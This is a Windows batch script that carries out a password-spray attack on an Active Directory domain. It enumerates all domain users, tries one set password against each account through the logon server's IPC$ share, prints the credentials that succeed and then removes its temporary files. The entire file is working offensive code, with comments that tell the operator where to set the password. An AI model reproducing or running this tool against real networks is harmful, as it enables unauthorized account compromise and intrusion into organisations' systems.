@echo off
setlocal enabledelayedexpansion

rem Create the users.txt by parsing the "net users /domain" output
del %temp%\1.txt >nul 2>&1
del %temp%\2.txt >nul 2>&1
del %temp%\3.txt >nul 2>&1
del %temp%\users.txt >nul 2>&1

rem Parse the output of "net users /domain" and create the users.txt file
for /f "skip=6 delims=" %%a in ('net users /domain ^| findstr /v /c:"The command c"') do (
    set line=%%a
    echo !line:  =,! >> %temp%\1.txt
)

for /f "delims=" %%a in (%temp%\1.txt) do (
    set line=%%a
    echo !line:, =,! >> %temp%\2.txt
)

for /f "tokens=1-3 delims=," %%n in (%temp%\2.txt) do (
    echo %%n >> %temp%\3.txt
    echo %%o >> %temp%\3.txt
    echo %%p >> %temp%\3.txt
)

for /f "tokens=*" %%a in ('type %temp%\3.txt ^| findstr /v /c:"ECHO is on."') do (
    echo %%a >> %temp%\users.txt
)

rem Reset the command window title so you can see the progress of the password spray in the title
title Command Prompt

rem Set your password for the spray here
set password=Summer2024

rem Execute the password spray, trying the password set above for every user in the domain
for /f %%n in (%temp%\users.txt) do (
    net use %logonserver%\IPC$ /user:"%userdomain%\%%n" "%password%" >nul 2>&1
    if !errorlevel! equ 0 (
        echo [*] %%n:%password%
        net use /delete %logonserver%\IPC$ >nul
    )
)

rem Clean up temporary files
del %temp%\1.txt >nul 2>&1
del %temp%\2.txt >nul 2>&1
del %temp%\3.txt >nul 2>&1
del %temp%\users.txt >nul 2>&1

endlocal
pause
